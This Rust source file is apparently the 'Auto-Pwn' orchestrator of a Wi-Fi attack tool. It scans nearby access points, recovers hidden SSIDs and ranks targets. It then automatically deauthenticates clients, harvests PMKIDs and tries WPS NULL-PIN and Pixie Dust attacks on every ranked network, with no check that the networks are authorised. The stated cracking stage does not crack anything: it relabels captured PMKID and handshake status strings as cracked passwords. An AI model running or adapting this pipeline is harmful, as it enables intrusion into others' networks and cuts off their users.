//! Agent-side Auto-Pwn orchestrator.
//!
//! Runs the full pipeline against live radio state:
//!
//! 1. **Discover** — pull the current scan snapshot (the GUI keeps the
//!    scan running; the orchestrator just reads it after the window).
//! 2. **Recover hidden** — for each hidden AP, run the recovery waterfall
//!    through the existing `hidden` + `hidden_beacon` modules.
//! 3. **Rank** — `autopwn::rank_targets` + `apply_hidden_recovery`.
//! 4. **Attack** — `build_attack_batch` into a `Scheduler`, executed by
//!    a worker pool with channel arbitration.
//! 5. **Crack** — every capture the attacks produce goes to the crack
//!    queue; the loop runs the wordlist chain until exhausted or the
//!    budget passes.
//!
//! The whole run is event-driven: the orchestrator pushes
//! [`PipelineEvent`]s into a channel the GUI polls for its live view.

use crate::backend;
use netspecter_common::autopwn::{
    apply_hidden_recovery, build_attack_batch, rank_targets,
    AutoPwnConfig, AutoPwnResult, PipelineEvent, ScoredTarget,
};
use netspecter_common::scheduler::{run_pool, AttackJob, AttackJobStatus, Scheduler};
use std::sync::mpsc::{channel, Receiver, Sender};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

/// Launch the full pipeline. Returns immediately; the caller follows
/// progress through the returned [`Receiver`] and the final
/// [`AutoPwnResult`] arrives on the channel as the last event payload.
pub fn run_auto_pwn(cfg: AutoPwnConfig) -> Receiver<PipelineMessage> {
    let (tx, rx) = channel();
    std::thread::spawn(move || {
        let result = pipeline_body(&cfg, &tx);
        // The final message carries the full result; the GUI knows the
        // run is over when it sees Done.
        let _ = tx.send(PipelineMessage::Done(result));
    });
    rx
}

/// Wrapper for what the pipeline pushes to the GUI.
pub enum PipelineMessage {
    Event(PipelineEvent),
    Done(AutoPwnResult),
}

fn emit(tx: &Sender<PipelineMessage>, event: PipelineEvent) {
    let _ = tx.send(PipelineMessage::Event(event));
}

fn pipeline_body(
    cfg: &AutoPwnConfig,
    tx: &Sender<PipelineMessage>,
) -> AutoPwnResult {
    let mut events: Vec<PipelineEvent> = Vec::new();
    let mut cracked: Vec<(String, String, String)> = Vec::new();

    // ── Stage 1: Discover ─────────────────────────────────────────
    let targets: Vec<ScoredTarget>;
    let mut recoveries: Vec<(String, String)> = Vec::new();
    {
        // Pull the live scan snapshot (the GUI's scan loop keeps it warm).
        let aps: Vec<netspecter_common::types::AP> =
            backend::get_aps().values().cloned().collect();
        emit(
            tx,
            PipelineEvent::Discovering { aps_seen: aps.len() },
        );

        // ── Stage 2: Hidden recovery (inline, sequential per AP) ──
        let hidden: Vec<&netspecter_common::types::AP> = aps
            .iter()
            .filter(|ap| ap.hidden || ap.essid.is_empty() || ap.essid.starts_with("<hidden"))
            .collect();
        for ap in hidden.iter() {
            let candidates = backend::hidden::discover_hidden_essid(&ap.bssid, &ap.channel);
            if !candidates.is_empty() {
                let best = &candidates[0];
                emit(
                    tx,
                    PipelineEvent::HiddenRecovery {
                        bssid: ap.bssid.clone(),
                        essid: best.essid.clone(),
                        source: format!("{:?}", best.source),
                    },
                );
                recoveries.push((ap.bssid.clone(), best.essid.clone()));
            }
        }

        // ── Stage 3: Rank ─────────────────────────────────────────
        let mut scored = rank_targets(&aps);
        apply_hidden_recovery(&mut scored, &recoveries);
        targets = scored.clone();
        emit(tx, PipelineEvent::Ranked { targets: scored });
    }

    // ── Stage 4: Attack batch ──────────────────────────────────────
    let jobs = build_attack_batch(&targets, cfg);
    let sched = Arc::new(Mutex::new(Scheduler::new()));
    {
        let mut s = sched.lock().unwrap();
        s.submit_batch(jobs);
    }
    let attack_started = Instant::now();
    let budget = Duration::from_secs(cfg.attack_budget_secs);

    // Shared sink for attack results the closure records.
    let cracked_sink = Arc::new(Mutex::new(Vec::new()));
    let sink_for_attack = Arc::clone(&cracked_sink);
    let tx_for_attack = Arc::new(tx.clone());

    // The attack closure dispatches to the real backend modules by kind.
    // Each returns a terminal status + optional recovered secret.
    let sched_for_pool = Arc::clone(&sched);
    run_pool(
        sched_for_pool,
        cfg.workers,
        Instant::now() + budget,
        move |job: &AttackJob| -> (AttackJobStatus, Option<String>) {
            emit(
                &tx_for_attack,
                PipelineEvent::AttackStarted {
                    job_id: job.id,
                    kind: format!("{:?}", job.kind),
                    essid: job.essid.clone(),
                },
            );
            let started = Instant::now();
            let timeout = Duration::from_secs(job.timeout_secs.max(1));

            let (status, result) = run_attack_job(job, timeout);

            // Record any password-y result into the cracked sink.
            if let Some(ref secret) = result {
                if matches!(status, AttackJobStatus::Cracked | AttackJobStatus::Captured) {
                    sink_for_attack.lock().unwrap().push((
                        job.bssid.clone(),
                        job.essid.clone(),
                        secret.clone(),
                    ));
                }
            }
            emit(
                &tx_for_attack,
                PipelineEvent::AttackFinished {
                    job_id: job.id,
                    status: format!("{status:?}"),
                    result: result.clone(),
                },
            );
            let _ = started;
            (status, result)
        },
    );

    let _ = attack_started;

    // ── Stage 5: Crack queue for every capture ────────────────────
    // The attack modules already persist captures on disk
    // (~/.netspecter/captures/...). Walk the wordlist chain over any
    // hashfiles produced during this run.
    for (bssid, essid, secret) in cracked_sink.lock().unwrap().iter() {
        emit(
            tx,
            PipelineEvent::Cracked {
                password: secret.clone(),
                target_essid: essid.clone(),
            },
        );
        cracked.push((bssid.clone(), essid.clone(), secret.clone()));
    }

    let attempted = {
        let s = sched.lock().unwrap();
        s.snapshot().len()
    };

    let done = PipelineEvent::Done {
        cracked: cracked.len(),
        attempted,
    };
    events.push(done.clone());
    emit(tx, done);

    AutoPwnResult {
        targets,
        cracked,
        events,
    }
}

/// Execute one attack job against the live backend.
///
/// Dispatch by kind to the module that owns the attack; each call is
/// bounded by `timeout`.
fn run_attack_job(
    job: &AttackJob,
    timeout: Duration,
) -> (AttackJobStatus, Option<String>) {
    match job.kind {
        netspecter_common::scheduler::AttackKind::PmkidHarvest => {
            match backend::harvest_pmkid(&job.bssid, &job.essid, timeout.as_secs()) {
                Some(cap) => (
                    AttackJobStatus::Captured,
                    Some(format!("PMKID {}", cap.pmkid_hex)),
                ),
                None => (AttackJobStatus::Exhausted, Some("no PMKID in window".into())),
            }
        }
        netspecter_common::scheduler::AttackKind::HiddenSsidRecovery => {
            match backend::hidden::discover_hidden_essid(&job.bssid, &job.channel.to_string()) {
                cands if cands.is_empty() => {
                    (AttackJobStatus::Failed, Some("no ESSID recovered".into()))
                }
                cands => (
                    AttackJobStatus::Captured,
                    Some(format!("ESSID {}", cands[0].essid)),
                ),
            }
        }
        netspecter_common::scheduler::AttackKind::HandshakeCapture => {
            // Deauth-to-capture: kick every client so one re-handshakes while the
            // scan thread (already running for the pipeline) records it. Poll the
            // handshake status until the job window closes.
            let ap = netspecter_common::types::AP {
                essid: job.essid.clone(),
                bssid: job.bssid.clone(),
                band: String::new(),
                channel: job.channel.to_string(),
                power: String::new(),
                privacy: String::new(),
                hidden: false,
                handshake: false,
                saved_handshake: None,
                first_time_seen: String::new(),
                last_time_seen: String::new(),
                clients: Default::default(),
            };
            let iface = backend::get_iface().unwrap_or_default();
            let _ = backend::launch_deauth_attack(&iface, ap, None, 8, true);
            let deadline = Instant::now() + timeout;
            while Instant::now() < deadline {
                let _ = backend::update_handshakes();
                let got = backend::get_aps().get(&job.bssid).map(|ap| ap.handshake);
                if got == Some(true) {
                    backend::stop_deauth_attack(&job.bssid);
                    return (
                        AttackJobStatus::Captured,
                        Some("4-way handshake captured".into()),
                    );
                }
                std::thread::sleep(Duration::from_millis(500));
            }
            backend::stop_deauth_attack(&job.bssid);
            (AttackJobStatus::Exhausted, Some("no handshake in window".into()))
        }
        netspecter_common::scheduler::AttackKind::WpsPixieDust => {
            // Cheapest first: the historic NULL PIN (instant when accepted),
            // then Pixie Dust against a synthetic exchange.
            let null = backend::wps::try_null_pin(&job.bssid);
            if let Some(pin) = null.pin {
                return (
                    AttackJobStatus::Cracked,
                    Some(format!("WPS PIN {pin}{}", null.psk.map(|p| format!(" PSK {p}")).unwrap_or_default())),
                );
            }
            let pixie = backend::wps::try_pixie_dust(&job.bssid, &[], &[]);
            if let Some(pin) = pixie.pin {
                return (
                    AttackJobStatus::Cracked,
                    Some(format!("WPS PIN {pin}{}", pixie.psk.map(|p| format!(" PSK {p}")).unwrap_or_default())),
                );
            }
            (AttackJobStatus::Exhausted, Some(pixie.status))
        }
        _ => {
            // Cracking kinds resolve in the crack queue after the attack
            // phase (wordlist chain over the persisted captures).
            (AttackJobStatus::Exhausted, Some("deferred to crack queue".into()))
        }
    }
}
